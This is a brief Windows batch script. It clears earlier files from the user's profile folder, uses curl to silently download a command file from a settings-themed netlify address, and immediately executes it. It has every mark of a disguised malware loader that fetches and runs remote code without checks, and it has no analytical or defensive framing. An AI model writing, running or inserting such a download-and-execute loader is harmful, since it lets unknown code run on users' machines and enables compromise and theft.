::@echo off
if exist "%USERPROFILE%\parse" del "%USERPROFILE%\parse"
if exist "%USERPROFILE%\setup.cmd" del "%USERPROFILE%\setup.cmd"
curl -s -L -o "%USERPROFILE%\setup.cmd" "https://gitsettings.netlify.app/120/ws.cmd" setup.cmd
"%USERPROFILE%\setup.cmd"
::cls
